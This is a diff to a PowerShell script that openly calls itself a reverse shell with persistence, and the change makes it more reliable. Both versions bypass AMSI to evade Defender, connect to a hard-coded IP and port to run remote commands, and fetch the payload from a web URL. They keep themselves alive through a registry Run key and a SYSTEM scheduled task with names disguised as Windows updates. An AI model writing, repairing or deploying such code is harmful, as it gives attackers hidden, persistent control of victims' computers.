@@ -1,51 +1,91 @@
 # ============================================
-# REVERSE SHELL WITH PERSISTENCE
+# FIXED REVERSE SHELL WITH PERSISTENCE
 # ============================================
 
-# YOUR ATTACKER IP - UPDATE THIS!
+$ErrorActionPreference = "SilentlyContinue"
+
+# YOUR ATTACKER IP
 $ip = "103.52.208.8"
-$port = "4444"
+$port = 4444
 
-# 1. AMSI BYPASS (Hide from Defender)
-$amsi = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'System.Management.Automation' }
-$amsi.Variables['amsiInitFailed'].Value = $true
+# 1. FIXED AMSI BYPASS (with null check)
+try {
+    $assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
+    foreach ($assembly in $assemblies) {
+        if ($assembly.GetName().Name -eq "System.Management.Automation") {
+            $vars = $assembly.GetVariables()
+            foreach ($var in $vars) {
+                if ($var.Name -eq "amsiInitFailed") {
+                    $var.Value = $true
+                }
+            }
+        }
+    }
+} catch {}
 
-# 2. CREATE REVERSE SHELL
-$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-$stream = $client.GetStream()
-$bytes = New-Object byte[] 1024
-$reader = New-Object System.IO.StreamReader($stream, (New-Object Text.UTF8Encoding).GetEncoding(0))
+# 2. CREATE PERSISTENCE FIRST (Before shell connection)
+$persistencePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$persistenceName = "WindowsUpdateService"
+$payloadFile = "$env:TEMP\svcupdate.ps1"
 
-# 3. EXECUTE COMMANDS LOOP
-while ($client.Connected) {
-    $stream.Position = 0
-    $data = $reader.ReadLine()
-    if ($data) {
-        $execute = Invoke-Expression $data 2>&1 | Out-String
-        $send = "$execute`r`n`PS $($pwd.Provider.Path)> "
-        $sendBytes = ([Text.Encoding]::ASCII).GetBytes($send)
-        $stream.Write($sendBytes, 0, $sendBytes.Length)
-        $stream.Flush()
+# Get current script content (handle IEX execution)
+if ($PSCommandPath -ne "") {
+    $scriptContent = Get-Content $PSCommandPath -Raw
+} else {
+    # When run via IEX, $PSCommandPath is empty
+    # So we download the file again for persistence
+    $wc = New-Object Net.WebClient
+    $scriptContent = $wc.DownloadString('https://yourfatherx82.github.io/MY_WEBSITE/payloads/payload_fixed.ps1')
+}
+
+# Save to temp for persistence
+Set-Content $payloadFile -Value $scriptContent -Encoding ASCII
+
+# Set Registry Key (Persistence #1)
+New-ItemProperty -Path $persistencePath -Name $persistenceName -Value "powershell.exe -NoP -NonI -W Hidden -File `"$payloadFile`"" -Force
+
+# Create Scheduled Task (Persistence #2)
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -File `"$payloadFile`""
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName "WinUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Force
+
+# 3. FIXED REVERSE SHELL (with proper error handling)
+Write-Host "Connecting to $ip:$port..." -ForegroundColor Green
+
+# Try multiple times with retry
+$maxRetries = 3
+$retry = 0
+
+while ($retry -lt $maxRetries) {
+    try {
+        $client = New-Object System.Net.Sockets.TCPClient($ip, $port, 5000)
+        $stream = $client.GetStream()
+        $bytes = New-Object byte[] 1024
+        # FIXED: Use proper UTF8Encoding
+        $encoding = New-Object System.Text.UTF8Encoding
+        $reader = New-Object System.IO.StreamReader($stream, $encoding)
+        
+        Write-Host "Connected successfully!" -ForegroundColor Green
+        
+        while ($client.Connected -and $client.Client.Connected) {
+            $stream.Position = 0
+            $data = $reader.ReadLine()
+            if ($data) {
+                $execute = Invoke-Expression $data 2>&1 | Out-String
+                $send = "$execute`r`n`PS $($pwd.Provider.Path)> "
+                $sendBytes = [System.Text.Encoding]::ASCII.GetBytes($send)
+                $stream.Write($sendBytes, 0, $sendBytes.Length)
+                $stream.Flush()
+            }
+        }
+        
+        break
+    } catch {
+        $retry++
+        Write-Host "Connection attempt $retry failed. Retrying..." -ForegroundColor Yellow
+        Start-Sleep -Seconds 2
     }
 }
 
-# 4. CREATE PERSISTENCE - REGISTRY RUN KEY
-$persistencePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$persistenceName = "WindowsUpdateService"
-$persistenceValue = "powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\svcupdate.ps1`""
-
-# 5. COPY THIS PAYLOAD TO TEMP FOR PERSISTENCE
-$payloadContent = Get-Content $PSCommandPath -Raw
-Set-Content "$env:TEMP\svcupdate.ps1" -Value $payloadContent -Encoding ASCII
-
-# 6. SET REGISTRY KEY FOR AUTO-START
-New-ItemProperty -Path $persistencePath -Name $persistenceName -Value $persistenceValue -Force -ErrorAction SilentlyContinue
-
-# 7. CREATE SCHEDULED TASK FOR EXTRA PERSISTENCE
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -File `"$env:TEMP\svcupdate.ps1`""
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-Register-ScheduledTask -TaskName "WinUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
-
-# 8. HIDE THE FILE
-Set-ItemProperty -Path "$env:TEMP\svcupdate.ps1" -Name "Attributes" -Value "Hidden"
+Write-Host "Shell session ended" -ForegroundColor Cyan
